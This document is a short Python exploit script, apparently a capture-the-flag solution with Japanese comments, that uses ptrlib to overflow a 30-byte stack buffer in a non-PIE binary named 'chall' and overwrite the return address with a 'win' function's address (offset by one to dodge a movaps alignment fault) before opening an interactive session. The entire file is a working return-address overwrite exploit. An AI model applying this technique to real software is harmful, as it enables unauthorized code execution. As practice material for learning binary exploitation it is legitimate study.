import time
from ptrlib import *

def main():
    elf = ELF("./chall")
    proc = Process("./chall")

    # -fno-pie なので関数のアドレスがすぐわかる
    addr_win = elf.symbol("win")

    # buf を埋めたあと、saved rip を win に書き換えれば良い
    buf_size = 30
    stack_size = (buf_size + 15) // 16 * 16 # buf_size 以上で最小の 16 の倍数

    payload = b"A" * 29 + b"\0" # buf を埋める(puts で読みすぎないように \0 を入れる)
    payload += b"B" * (stack_size - buf_size) # 余りを埋める
    payload += b"0" * 0x8 # saved rbp を埋める
    payload += p64(addr_win + 1) # return address を win 関数のアドレスに書き換える(movaps で死ぬので push rbp を飛ばす)
    payload += b"\n"

    proc.send(payload)
    proc.interactive()
    return

if __name__ == "__main__":
    main()
